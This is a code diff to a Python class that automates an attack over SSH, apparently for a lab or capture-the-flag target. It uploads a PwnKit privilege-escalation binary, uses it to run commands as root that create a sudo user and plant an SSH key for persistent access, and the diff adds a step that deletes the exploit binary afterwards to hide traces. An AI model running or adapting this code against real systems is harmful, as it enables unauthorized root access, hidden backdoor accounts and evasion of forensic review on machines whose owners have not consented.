@@ -53,8 +53,9 @@ class UserIP:
 			logger.info("Copying pwnkit_x64 binary over SSH...")
 			sftp = ssh_client.open_sftp()
 			pwnkit_binary_name = "pwnkit_x64"
-			sftp.put(localpath=f"./binaries/{pwnkit_binary_name}", remotepath=f"/home/{username}/{pwnkit_binary_name}", confirm=True)
-			logger.info(f"Successfully copied {pwnkit_binary_name} binary over SSH")
+			pwnkit_destination_path = f"/home/{username}/{pwnkit_binary_name}"
+			sftp.put(localpath=f"./binaries/{pwnkit_binary_name}", remotepath=pwnkit_destination_path, confirm=True)
+			logger.info(f"Successfully copied {pwnkit_binary_name} binary over SSH.")
 			sftp.close()
 
 			logger.info("Setting the pwnkit binary to be executable...")
@@ -75,7 +76,9 @@ class UserIP:
 			logger.info("Creating sudo user to log in as...")
 			useradd_command = "useradd -m josh -g sudo -s /bin/bash"
 			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo '{useradd_command}' | ./{pwnkit_binary_name}")
-			logger.error(ssh_stderr.read().decode().strip())
+			ssh_stderr_text = ssh_stderr.read().decode().strip()
+			if ssh_stderr_text != "":
+				logger.error(ssh_stderr_text)
 			logger.info("Successfully created user to log in as.")
 
 			logger.info("Adding SSH key to elliot's authorized keys...")
@@ -94,6 +97,13 @@ class UserIP:
 			if ssh_stderr_text != "":
 				logger.error(ssh_stderr_text)
 			logger.info("Successfully added SSH key to josh's authorized keys.")
+
+			logger.info("Cleaning up pwnkit binary...")
+			ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo 'rm {pwnkit_destination_path}' | ./{pwnkit_binary_name}")
+			ssh_stderr_text = ssh_stderr.read().decode().strip()
+			if ssh_stderr_text != "":
+				logger.error(ssh_stderr_text)
+			logger.info("Successfully cleaned up up pwnkit binary.")
 
 			ssh_client.close()
 
